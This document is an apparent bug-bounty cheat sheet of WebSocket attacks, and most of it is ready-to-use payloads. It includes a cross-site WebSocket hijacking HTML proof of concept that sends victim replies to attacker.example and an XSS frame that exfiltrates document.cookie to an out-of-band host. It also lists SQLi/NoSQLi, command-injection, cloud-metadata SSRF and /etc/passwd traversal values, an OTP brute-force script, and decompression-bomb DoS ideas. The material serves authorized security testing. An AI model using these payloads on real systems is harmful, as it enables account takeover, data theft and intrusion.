# WebSocket Attack Arsenal — Handshake/CSWSH PoCs, Frame-Tamper Payloads & Recipes

**Author:** x8bitranjit

> Companion to `WEBSOCKET_TESTING_GUIDE.md`. **Read the handshake first (cookie-vs-token auth, Origin check, wss), then attack the frames.** Replace `target.com`, `<victim cookie>`/`<A_TOKEN>`, `attacker.example`, `YOUR.oast.fun`. **Authorized targets only; CSWSH/PoCs use YOUR own victim account and exfil to YOUR server; two accounts for IDOR; measured counts for brute; measure-don't-flood for DoS** (guide §21).
>
> **Workflow:** find WS (§3) → baseline handshake/auth (§4) → CSWSH (§5) → per-message authz/IDOR (§6) → message injection (§8) → escalate.

---

## A. Find & connect (set once)
```bash
# Find sockets: DevTools→Network→WS, or grep JS for: new WebSocket(  io(  SockJS(  signalr  wss://  /ws  /socket.io  /cable  /hub
# Connect from CLI (set Origin + cookie to mirror the browser handshake):
websocat -H='Origin: https://target.com' -H='Cookie: session=<victim cookie>' 'wss://target.com/ws'
wscat -c 'wss://target.com/ws' -H 'Origin: https://target.com' -H 'Cookie: session=<victim cookie>'
# Burp: Proxy → WebSockets (history) → intercept/edit/resend frames; "Send to Repeater".
```

## B. Handshake / CSWSH oracle — vary the Origin (§5)
```bash
# Does it stay AUTHENTICATED with a FOREIGN Origin + the victim cookie? (CLI oracle for CSWSH)
websocat -H='Origin: https://evil.example'        -H='Cookie: session=<victim>' 'wss://target.com/ws'   # foreign
websocat -H='Origin: https://target.com.evil.com' -H='Cookie: session=<victim>' 'wss://target.com/ws'   # suffix
websocat -H='Origin: https://eviltarget.com'      -H='Cookie: session=<victim>' 'wss://target.com/ws'   # prefix
websocat -H='Origin: null'                        -H='Cookie: session=<victim>' 'wss://target.com/ws'   # null
websocat                                          -H='Cookie: session=<victim>' 'wss://target.com/ws'   # NO Origin
# Connects + authed with a foreign Origin → CSWSH (confirm in a real browser, §F). Auth must be the COOKIE.
```

## C. CSWSH browser PoC (host on attacker origin; open as logged-in victim) (§9/§19)
```html
<!-- cswsh.html : read the victim's data AND fire a state change, exfil to your server -->
<script>
  var ws = new WebSocket("wss://target.com/ws");        // victim cookie auto-attaches
  ws.onopen = function(){
    ws.send('{"type":"getMessages"}');                  // read private data
    ws.send('{"type":"updateEmail","email":"attacker+ws@your-inbox.test"}'); // state change → ATO
  };
  ws.onmessage = function(e){
    fetch("https://attacker.example/leak?d=" + encodeURIComponent(e.data));  // exfil the reply
  };
</script>
```

## D. Auth / authz over WS — IDOR & BFLA in frames (§6)
```
# connect as A, then send frames referencing B's ids / privileged actions:
{"type":"getMessages","conversationId": <B_ID>}        # read B's conversation (IDOR)
{"type":"getProfile","userId": <B_ID>}                 # read B's profile
{"type":"placeOrder","accountId": <B_ID>, "qty":1}     # act as B (BFLA/IDOR)
{"type":"adminBroadcast","msg":"x"}                    # privileged op as a normal user (BFLA)
{"type":"subscribe","channel":"user.<B_ID>"}           # pub/sub: join B's / admin channel
{"type":"subscribe","channel":"admin"}
# Unauth: connect with NO auth and try the above — which message types still work?
```

## E. Message injection — treat every field as untrusted (§8)
```
# Stored/reflected XSS (chat/comment rendered to others):
{"type":"chat","room":"general","text":"<img src=x onerror=fetch('//YOUR.oast.fun/'+document.cookie)>"}
{"type":"chat","text":"<svg onload=alert(document.domain)>"}
# SQLi / NoSQLi in a search/filter/id field:
{"type":"search","q":"' OR '1'='1"}            {"type":"search","q":"x' UNION SELECT @@version-- -"}
{"type":"getUser","id":{"$ne":null}}           {"type":"login","user":{"$gt":""},"pass":{"$gt":""}}
# OS command / SSRF:
{"type":"convert","format":"pdf; sleep 10"}    {"type":"fetch","url":"http://169.254.169.254/latest/meta-data/"}
{"type":"fetch","url":"http://YOUR.oast.fun/ws"}        # blind SSRF → confirm via interactsh
# Path traversal / LFI · mass assignment · type juggling:
{"type":"download","file":"../../../../etc/passwd"}
{"type":"updateProfile","name":"x","role":"admin","isAdmin":true}     # mass-assign over WS
{"type":"getUser","id":[123]}                  {"type":"getUser","id":"123 OR 1=1"}
```

## F. Real-browser CSWSH proof (validity gate) (§15)
```
1. Host C's cswsh.html on a DIFFERENT origin (https://attacker.example).
2. In a normal browser (default settings), log in as the VICTIM test account at target.com.
3. Open https://attacker.example/cswsh.html in the SAME browser.
4. Observe: the socket connects (handshake Origin: attacker, ACCEPTED authed) and your server
   receives the victim's private message data (and/or the email changed → ATO).
→ That cross-origin, real-browser, authenticated connect is the proof (not a websocat-only connect).
```

## G. Rate-limit / brute over WS (§10)
```python
# OTP/login often has NO per-message limit over WS — many attempts on ONE socket:
import asyncio, websockets, json
async def brute():
    async with websockets.connect("wss://target.com/ws", extra_headers={"Cookie":"session=<A>"}) as ws:
        for code in range(0, 1000):                      # 000..999 (bounded; your own account)
            await ws.send(json.dumps({"type":"verifyOtp","code":f"{code:03d}"}))
            print(await ws.recv())
asyncio.run(brute())
# WIN = far MORE attempts accepted than the HTTP cap → rate-limit bypass → ATO. Don't brute real users.
```

## H. Transport / token handling (§7)
```bash
# Cleartext ws:// (sniffable):
echo "ws://target.com/ws → no TLS → handshake cookies + frames in cleartext (CWE-319)"
# Token in the URL (logged in proxies/history/Referer):
echo "wss://target.com/ws?token=<JWT>  → token belongs in the handshake auth, not the query (CWE-598)"
# Socket outlives logout/revocation? log out / revoke token, then check the socket still works.
```

## I. DoS — MEASURE, do not flood (permission) (§11)
```
- connection exhaustion: open many sockets, never close (note missing per-IP/user caps).
- large/fragmented frames: oversized message (no max-frame-size?).
- permessage-deflate bomb: if the server negotiates compression, a tiny highly-compressible payload
  decompresses huge server-side → memory DoS (note missing decompressed-size limit).
- idle/half-open sockets: no ping/pong timeout → resource tie-up.
```

## J. Framework recipes (§13)
```
socket.io / engine.io : /socket.io/?EIO=4&transport=websocket ; frames like 42["event",{...}] (tamper inside the array).
SignalR (.NET)        : POST /negotiate → connectionToken → WS /hub ; test hub-method authorization (BFLA).
STOMP over WS         : SEND/SUBSCRIBE frames with destination: header → subscribe to other/admin destinations.
SockJS                : falls back to XHR/EventSource — test those transports' Origin/CSRF too.
graphql-ws            : connection_init + subscribe → CSWSH + GraphQL BOLA (see GraphQL kit §15.5).
Rails ActionCable /cable · Phoenix Channels · MQTT-over-WS : channel/topic subscribe → test channel authz.
```

## K. Validity checklist (paste per sub-bug) (§15)
```
CSWSH        → attacker-origin page, logged-in victim, default browser → handshake (Origin:attacker) ACCEPTED authed → data exfil/state change. Auth must be a COOKIE.
IDOR/BFLA-WS → two accounts: A's socket + B's id in a frame → B's data/action back.
injection    → XSS fires in a RECIPIENT / SQL error-UNION-time / OOB callback, reproducible.
rate-limit   → measured count: N message attempts accepted where the cap is 1/5.
transport    → ws:// carries auth/PII, or token in URL (logged).
DoS          → measured resource amplification (permission); no sustained outage.
```

## L. Real-world WebSocket patterns & references
```
CSWSH (no Origin check + cookie auth)  → read victim's private messages + change email → ATO (the flagship).
Stored XSS via chat message            → executes in recipients' DOM → session theft (missed by HTTP-only testing).
IDOR/BFLA over WS (no per-msg authz)   → swap conversation/account id in a frame → cross-user read/action.
Rate-limit bypass over WS              → brute OTP/login on one socket → ATO.
ws:// cleartext / token-in-URL         → sniff/log auth (Medium).
socket.io/SignalR/STOMP Origin/channel → CSWSH + broken channel authz.
Refs: PortSwigger WebSockets (CSWSH/handshake/message labs); OWASP WSTG WebSockets; RFC 6455/7692;
      CWE-1385/346/352/319/598/306/862 + the injection CWEs (79/89/943/77/78/918/22).
```

**Contact:** [LinkedIn](https://in.linkedin.com/in/x8bitranjit)
